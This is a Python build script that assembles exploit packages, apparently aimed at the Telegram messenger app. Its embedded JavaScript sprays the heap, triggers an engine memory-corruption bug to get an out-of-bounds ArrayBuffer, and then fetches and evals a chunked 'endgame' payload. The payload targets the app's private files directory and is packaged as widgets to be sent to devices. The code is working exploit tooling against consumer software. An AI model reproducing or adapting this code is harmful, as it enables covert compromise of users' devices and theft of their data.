#!/usr/bin/env python3
"""Generate the parallel universal package (host-side only).

Outputs:
  stageA_sp.js              template instance per variant (V0..V3)
  w_v0.html .. w_v3.html    device widgets (stage A + answer-channel driver)
  m_v0.html .. m_v3.html    host mocks (same stage A + mock TelegramWidget + host endgame)
  m_ra.html                 re-arm path test (attempt 0 forced miss, attempt 1 hit)
  chunks/E0..E7.txt         1000-B chunks of endgame_72801.js (device endgame)
  send_batch.json           sendWidget bodies (height 50) - host artifact, not sent
No network, no bot, no device.
"""
import json, os, re, zlib

HERE = os.path.dirname(os.path.abspath(__file__))
OOB = os.path.join(HERE, "..", "pixel72801_route2", "oob")
HOST_ENDGAME = os.path.join(OOB, "endgame_host.js")
DEV_ENDGAME = os.path.join(OOB, "endgame_72801.js")
DRIVER = os.path.join(OOB, "driver.js")

# Per-variant placement table: list of [NP, NQ].  Variant 0 is the
# max-coverage first attempt (deep both sides); the others re-order the
# depth so the K parallel sandboxes cover the NP/NQ space on an unknown
# device.  Same table for every device: the K files are fixed.
VARIANTS = {
    0: [[2600, 2600], [4000, 2600]],
    1: [[3200, 3000], [2600, 3600]],
    2: [[4000, 2600], [3200, 3000]],
    3: [[2600, 3600], [3600, 3200]],
}

STAGE_A = r''''use strict';var HS=__H__,ATT=0,mark='NOCORR',T0=Date.now();function prime(){var G=new Array(1500),i;for(i=0;i<1500;i++)G[i]='x'.repeat(2048);var G0={};G=null;G0=null}function gcNow(){var G=new Array(1500),i;for(i=0;i<1500;i++)G[i]='y'.repeat(2048);var G0={};G=null;G0=null}var RT=[4,0,0,128,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0],RJ=[4,0,0,128,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0],U=new Uint8Array(479),o;for(o=28;o+40<=479;o+=40)for(var k=0;k<20;k++)U[o+k]=RJ[k],U[o+20+k]=RT[k];var S='"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 1.1+2.2+3.3+4.4+5.5+6.6+7.7+8.8+9.9; };';prime();var V=null,VAB=null,T=null,SP=null;for(ATT=0;ATT<HS.length&&mark==='NOCORR';ATT++){if(ATT>0){gcNow()}var NP=HS[ATT][0],NQ=HS[ATT][1],A=new Array(NP+NQ),i;for(i=0;i<NP;i++)A[i]=String.fromCharCode.apply(null,U);var X=String.fromCharCode.apply(null,U);X=null;(0,eval)(S);for(i=NP;i<NP+NQ;i++)A[i]=String.fromCharCode.apply(null,U);var D=new Array(600);for(i=0;i<600;i++)D[i]=new ArrayBuffer(64);T=new Array(600);for(i=0;i<600;i++)T[i]=new ArrayBuffer(64);T[598]=null;__MISS0__try{f()}catch(e){}for(i=0;i<600;i++)if(T[i]!==null&&T[i].byteLength>1024){mark='ABLEN['+i+']='+T[i].byteLength+' ATT='+ATT;break}if(mark==='NOCORR'){A=null;SP=null}else{SP=A}}if(VAB===null)for(var i=0;i<600;i++)if(T[i]!==null&&T[i].byteLength>1024){VAB=T[i];break}if(VAB)try{V=new Uint8Array(VAB);mark+=' VLEN='+V.length}catch(e){mark+=' VERR='+e}globalThis.V=V;globalThis.VAB=VAB;globalThis.T=T;globalThis.SP=SP;globalThis.mark=mark+' T0='+T0;'''

# Forced-miss twin: attempt 0 skips the trigger (a safe miss), so the sweep
# must re-arm and hit on attempt 1.  Used only for host validation.
STAGE_A_RA = STAGE_A.replace("__MISS0__", "__MISS0__")

DRIVER_TAIL = r'''
var STOP=0;'''
# The device driver is the proven oob/driver.js plus (a) the STOP sentinel and
# (b) keeping the spray referenced (SP) across the answer eval.
DRIVER = r'''(function(){
 var L=(typeof OOB_LEN=='number')?OOB_LEN:7469,
     Y=(typeof OOB_DLY=='number')?OOB_DLY:5200,
     N=Math.ceil(L/1000),P=[],T=0,F='W';
 function S(){var d=document.getElementById('v');if(d)d.textContent='S1 '+(typeof mark!='undefined'?mark:'-')+' | '+F}
 function Q(f,m){if(typeof setTimeout=='function')setTimeout(f,m);else f()}
 function G(i){
  if(i>=N){var s=P.join('');if(s.length!==L){F='LEN '+s.length;return S()}
   try{(0,eval)(s)}catch(e){F='EV '+e;return S()}
   F='HF '+(typeof MEGA!='undefined'?MEGA:'?');return S()}
  if(typeof TelegramWidget=='undefined'||!TelegramWidget.request){F='NOAPI';return S()}
  var p;try{p=TelegramWidget.request('E'+i)}catch(e){p=null}
  if(!p||typeof p.then!='function'){F='PROMISE';return S()}
  p.then(function(a){
   var s=(typeof a=='string')?a:(a&&typeof a.result=='string')?a.result:'';
   if(s==='X'){F='STOP';return S()}
   if(s.length<1){if(++T>2){F='F'+i;return S()}return Q(function(){G(i)},Y)}
   P[i]=s;T=0;F='G'+(i+1)+'/'+N;S();Q(function(){G(i+1)},(i+1<N)?Y:0)
  },function(){if(++T>2){F='X'+i;return S()}Q(function(){G(i)},Y)})
 }
 G(0)
})();'''


def build_widget(stage_a, driver, endgame_len=None, delay=None):
    head = '<!doctype html><body><div id="v">Ok</div>'
    cfg = ''
    if endgame_len is not None:
        cfg = 'var OOB_LEN=%d,OOB_DLY=%s;' % (endgame_len, delay)
    return head + '<script id="stageA">' + stage_a + '</script>' \
        + '<script id="stageC">' + cfg + driver + '</script>'


def build_mock(stage_a, driver, host_endgame):
    head = '<!doctype html><body><div id="v">Ok</div>'
    esc = json.dumps(host_endgame)
    mock = ('var OOB_LEN=%d,OOB_DLY=0;var __E=%s;'
            'var TelegramWidget={request:function(d){var i=+d.slice(1);'
            'return new Promise(function(r){r(Object.freeze({result:'
            '__E.slice(i*1000,(i+1)*1000)}))})}};' % (len(host_endgame), esc))
    return head + '<script id="stageA">' + stage_a + '</script>' \
        + '<script id="mock">' + mock + '</script>' \
        + '<script id="stageC">' + driver + '</script>'


def main():
    host_endgame = open(HOST_ENDGAME, encoding="utf-8").read()
    dev_endgame = open(DEV_ENDGAME, encoding="utf-8").read()
    # --pkg beta: the only per-package constant is the proof path (Sony beta).
    import sys
    src_path = DEV_ENDGAME
    if "--pkg" in sys.argv and "beta" in sys.argv[sys.argv.index("--pkg") + 1]:
        dev_endgame = dev_endgame.replace("org.telegram.messenger/files",
                                          "org.telegram.messenger.beta/files")
        src_path = os.path.join(HERE, "endgame_beta.js")
        open(src_path, "w").write(dev_endgame)
    results = {}

    # 1. device widgets + host mocks
    for vk, table in VARIANTS.items():
        stage = STAGE_A.replace("__H__", json.dumps(table)).replace("__MISS0__", "")
        open(os.path.join(HERE, "stageA_v%d.js" % vk), "w").write(stage)
        w = build_widget(stage, DRIVER)
        p = os.path.join(HERE, "w_v%d.html" % vk)
        open(p, "w").write(w)
        raw = len(w.encode())
        z9 = len(zlib.compress(w.encode(), 9))
        m = build_mock(stage, DRIVER, host_endgame)
        open(os.path.join(HERE, "m_v%d.html" % vk), "w").write(m)
        results["w_v%d" % vk] = {"raw": raw, "zlib9": z9}

    # 2. re-arm test: attempt 0 is a forced safe miss (trigger skipped),
    #    attempt 1 triggers -> the sweep must re-arm and hit on ATT=1.
    ra_stage = STAGE_A.replace("__H__", json.dumps([[2600, 2600], [2600, 2600]]))
    ra_stage = ra_stage.replace("__MISS0__", "if(ATT===0){}else ")
    open(os.path.join(HERE, "stageA_ra.js"), "w").write(ra_stage)
    open(os.path.join(HERE, "m_ra.html"), "w").write(
        build_mock(ra_stage, DRIVER, host_endgame))

    # 3. chunks of the device endgame (1000 B, 8 chunks)
    cdir = "chunks" if "beta" not in "".join(__import__("sys").argv) else "chunks_beta"
    os.makedirs(os.path.join(HERE, cdir), exist_ok=True)
    n = (len(dev_endgame) + 999) // 1000
    man = []
    for i in range(n):
        c = dev_endgame[i * 1000:(i + 1) * 1000]
        open(os.path.join(HERE, cdir, "E%d.txt" % i), "w").write(c)
        man.append({"i": i, "len": len(c), "sha256": __import__("hashlib").sha256(c.encode()).hexdigest()})
    json.dump({"n": n, "chunk": 1000,
               "source": os.path.abspath(src_path),
               "chunks": man},
              open(os.path.join(HERE, cdir, "manifest.json"), "w"), indent=1)

    # 4. sendWidget bodies (host artifact; height 50 keeps K bubbles on one screen)
    batch = []
    for vk in VARIANTS:
        html = open(os.path.join(HERE, "w_v%d.html" % vk)).read()
        batch.append({"chat_id": 0, "html": html, "height": 50,
                      "allow_queries": True, "background_query": True})
    json.dump({"method": "sendWidget", "beta": True, "messages": batch},
              open(os.path.join(HERE, "send_batch.json"), "w"), indent=1)

    print(json.dumps(results, indent=1))
    print("endgame chunks:", n, "source", len(dev_endgame), "B")
    print("host endgame:", len(host_endgame), "B")


if __name__ == "__main__":
    main()
